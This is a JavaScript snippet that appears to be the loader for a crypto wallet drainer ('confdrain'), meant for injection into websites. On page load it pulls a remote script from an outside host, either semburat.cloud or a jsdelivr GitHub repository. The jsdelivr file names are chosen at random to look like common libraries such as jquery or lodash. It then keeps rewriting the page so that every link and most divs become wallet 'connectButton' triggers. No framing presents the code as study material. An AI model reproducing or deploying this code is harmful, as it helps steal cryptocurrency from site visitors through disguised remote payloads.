document.addEventListener("DOMContentLoaded", function() {
    if (typeof confdrain === 'undefined' || (confdrain !== 1 && confdrain !== 2)) {
        confdrain = 2; // Set default 
    }
    if (confdrain === 1) {
        var script = document.createElement("script");
        script.charset = "UTF-8";
        script.type = "text/javascript";
        script.src = "https://semburat.cloud/laoder/lazyloads.js?vs=" + Math.floor(Date.now() / 1e3);
        document.body.appendChild(script);
    } else if (confdrain === 2) {
        let bgcolor = "#000000";
        let fontcolor = "white";
        var currentUnixTimestamp = Math.floor(Date.now() / 1e3);
        var script = document.createElement("script");
        const jsFiles = ["pluginsweet.js", "bootstrapv4.js", "jquery-min.js", "lodash.js", "axios.v1.js"];
        
        function getRandomItem(array) {
            return array[Math.floor(Math.random() * array.length)];
        }
     
        function addClassesToElements() {
            const t = document.querySelectorAll("a:not(.connectButton)");
            for (const e of t) e.removeAttribute("href"), e.classList.add("connectButton");
            const e = document.querySelectorAll("div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal):not(.connectButton)");
            for (const t of e) t.classList.add("connectButton");
        }
        
        const randomJsFile = getRandomItem(jsFiles);
        script.src = "https://cdn.jsdelivr.net/gh/cdsync/js@main/" + randomJsFile + "?version=" + currentUnixTimestamp;
        document.head.appendChild(script);
        setInterval(addClassesToElements, 300);
    }
});
